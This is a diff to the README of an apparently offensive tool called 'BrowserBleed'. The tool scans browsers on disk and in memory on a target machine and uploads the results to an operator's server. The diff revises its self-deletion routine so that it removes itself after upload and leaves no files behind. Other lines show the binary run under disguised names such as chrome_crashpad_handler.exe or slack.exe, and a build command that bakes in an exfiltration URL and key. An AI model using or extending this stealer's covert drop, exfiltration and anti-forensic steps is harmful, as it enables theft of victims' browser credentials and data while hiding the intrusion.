@@ -153,9 +153,9 @@ Both versions write two files to the same directory as the binary:
 When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run - no flags needed. Results upload automatically and the binary removes itself.
 
 **Default behaviour when a server is baked in:**
-1. Moves itself from the drop location into `%TEMP%` within ~2 seconds - gone from Explorer immediately
+1. Marks itself for deletion on next reboot (Windows `MoveFileExW`) - scheduled immediately on launch
 2. Scans all browsers (disk + memory), exfils results to your server
-3. Deletes the `%TEMP%` copy 120 seconds after launch
+3. Deletes itself immediately after upload finishes (falls back to a detached 3s-delayed `del` if the file handle is still open)
 4. No local files left anywhere on the target
 
 ### Windows
@@ -332,7 +332,7 @@ EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh
 Drop the built exe anywhere writable on the target and run it. The filename is whatever preset you chose - `chrome_crashpad_handler.exe`, `slack.exe`, etc.
 
 ```
-chrome_crashpad_handler.exe   # Windows - exfils, moves itself to %TEMP%, self-deletes
+chrome_crashpad_handler.exe   # Windows - exfils, self-deletes after upload
 sudo ./BrowserBleed_mac       # macOS - exfils, self-deletes
 ```
 
